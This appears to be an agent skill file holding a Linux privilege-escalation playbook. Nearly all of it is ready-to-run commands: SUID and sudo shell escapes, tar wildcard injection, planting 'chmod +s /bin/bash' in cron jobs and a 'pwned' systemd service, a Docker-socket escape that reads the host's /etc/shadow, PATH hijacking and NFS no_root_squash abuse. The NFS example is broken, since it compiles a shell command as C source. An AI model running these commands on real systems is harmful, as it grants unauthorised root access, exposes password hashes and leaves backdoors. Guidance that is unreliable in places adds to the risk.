---
name: privilege_escalation_linux
description: Linux privilege escalation techniques — SUID, sudo, capabilities, cron, kernel exploits, container escape, service abuse. Includes discovery commands and exploitation paths.
---

# Linux Privilege Escalation

## Quick Reconnaissance

Run these first to build a complete picture of the attack surface:

```bash
# Who am I? What can I do?
id && whoami && sudo -l 2>/dev/null

# SUID/GUID binaries
find / -perm -4000 -type f 2>/dev/null
find / -perm -2000 -type f 2>/dev/null

# Capabilities
getcap -r / 2>/dev/null

# Writable config/service files
find /etc -writable -type f 2>/dev/null
find /usr/local -writable -type f 2>/dev/null

# Cron jobs (all users)
cat /etc/crontab
ls -la /etc/cron.d/ /etc/cron.daily/ /etc/cron.hourly/ 2>/dev/null
for user in $(cut -d: -f1 /etc/passwd); do crontab -l -u $user 2>/dev/null; done

# Scheduled timers
systemctl list-timers --all 2>/dev/null

# World-writable directories in PATH or executed by root
find / -writable -type d 2>/dev/null | grep -v "^/proc\|^/sys\|^/tmp\|^/var/tmp"

# Interesting processes
ps auxf

# Network connections
ss -tlnp && ss -ulnp

# Kernel version (for CVE matching)
uname -r
cat /etc/os-release

# Docker socket?
ls -la /var/run/docker.sock 2>/dev/null
```

## SUID/GUID Binary Abuse

Find interesting SUID binaries and check [GTFOBins](https://gtfobins.github.io):

```bash
# Common exploitable SUID binaries
find / -perm -4000 -type f 2>/dev/null | grep -E "nmap|vim|find|bash|sh|python|perl|ruby|env|tar|wget|curl|awk|nc|netcat|socat|less|more|man|tee|ed|sed|cp|mv|dd|xxd|base64|time|timeout|watch|taskset|nice|ionice|flock|strace|ltrace|gdb|valgrind|make|gcc|cc|clang|git|hg|svn|rsync|ssh|scp|sftp|ftp|tftp|mount|umount|su|sudo|passwd|chsh|newgrp|pkexec|at|batch|crontab"
```

### High-Value SUID Examples

```bash
# find
find . -exec /bin/sh -p \;

# vim
vim -c ':!/bin/sh'

# nmap (old versions)
nmap --interactive
!sh

# python
python3 -c 'import os; os.execl("/bin/sh", "sh", "-p")'

# env
env /bin/sh -p

# less (exit with :!sh)
less /etc/passwd
# then: !sh

# tar (wildcard injection)
echo 'chmod +s /bin/bash' > /tmp/exploit.sh
echo "" > "--checkpoint-action=exec=sh /tmp/exploit.sh"
echo "" > --checkpoint=1
tar cf /dev/null *
```

## sudo Exploitation

```bash
# Check what we can run
sudo -l

# If (ALL) NOPASSWD → full privesc
sudo /bin/bash

# GTFOBins paths for limited sudo
# Example: sudo can run find
sudo find . -exec /bin/sh \;

# If we can run as another user
sudo -u otheruser /bin/bash

# sudo version vulnerabilities
sudo --version
# CVE-2021-3156 (Baron Samedit) < 1.9.5p2
# CVE-2019-14287 (ALL, !root) < 1.8.28
```

## Capabilities Abuse

```bash
# Find capabilities
getcap -r / 2>/dev/null

# cap_setuid → spawn root shell
# python with cap_setuid
python3 -c 'import os; os.setuid(0); os.execl("/bin/sh", "sh")'

# cap_net_raw → packet sniffing / ARP spoofing
# cap_net_admin → network manipulation
# cap_sys_admin → mount, namespace escape
# cap_dac_read_search → bypass file permissions
```

## Cron Job Abuse

```bash
# Writable cron scripts
find /etc/cron* -writable -type f 2>/dev/null
find /var/spool/cron -writable -type f 2>/dev/null

# Check PATH in cron
cat /etc/crontab | grep PATH

# If cron runs a script we can write
echo '#!/bin/bash' > /path/to/cron/script
echo 'chmod +s /bin/bash' >> /path/to/cron/script

# Wildcard injection (if cron uses tar *)
# Place in the directory cron tars:
echo 'chmod +s /bin/bash' > /tmp/exploit.sh
touch /tmp/--checkpoint=1
touch /tmp/--checkpoint-action=exec=sh\ /tmp/exploit.sh
```

## Kernel Exploits

```bash
uname -r
cat /etc/os-release
```

| Kernel | CVE | Notes |
|---|---|---|
| < 4.13.9 | DirtyCow (CVE-2016-5195) | /etc/passwd overwrite |
| < 5.19 | DirtyPipe (CVE-2022-0847) | Read-only file overwrite |
| 5.8 - 5.16 | CVE-2022-2588 | route4_change double free |
| 5.8+ | CVE-2023-0386 | OverlayFS |
| < 6.2 | CVE-2023-32233 | Netfilter nf_tables |
| < 6.1.25 | CVE-2023-1829 | tcindex cls |

## Container / Docker Escape

```bash
# Check if we're in a container
cat /proc/1/cgroup
ls /.dockerenv 2>/dev/null
cat /proc/self/mountinfo | grep docker

# Docker socket accessible → escape
ls -la /var/run/docker.sock
# If yes, mount host filesystem:
docker -H unix:///var/run/docker.sock run -v /:/mnt --rm -it alpine cat /mnt/etc/shadow

# Privileged container → escape
cat /proc/self/status | grep CapEff
# CapEff: 0000003fffffffff → privileged
fdisk -l  # see host disks
mkdir /mnt/host && mount /dev/sda1 /mnt/host

# Namespace escape
unshare --target 1 --mount --uts --ipc --net --pid --fork --privileged bash
```

## Service File Abuse

```bash
# Writable systemd service
find /etc/systemd -writable -type f 2>/dev/null

# Modify ExecStart or add ExecStartPre
# [Service]
# ExecStart=/bin/bash -c 'chmod +s /bin/bash'

# Create a new service
sudo tee /etc/systemd/system/pwned.service << 'EOF'
[Unit]
Description=Pwned
[Service]
Type=oneshot
ExecStart=/bin/bash -c 'chmod +s /bin/bash'
[Install]
WantedBy=multi-user.target
EOF
sudo systemctl daemon-reload && sudo systemctl start pwned
```

## PATH Hijacking

```bash
# If a SUID binary calls a command without full path
# Create a malicious version in a writable PATH directory
echo '/bin/bash -p' > /tmp/ls
chmod +x /tmp/ls
export PATH=/tmp:$PATH
# Trigger the SUID binary
```

## NFS no_root_squash

```bash
# From attack host, check for no_root_squash exports
showmount -e <target>
# If /path *(rw,no_root_squash):
mount -o rw <target>:/path /mnt/nfs
echo 'chmod +s /bin/bash' > /mnt/nfs/exploit.c
# Compile with static linking on attack host, execute on target
gcc -static -o /mnt/nfs/exploit /mnt/nfs/exploit.c
```
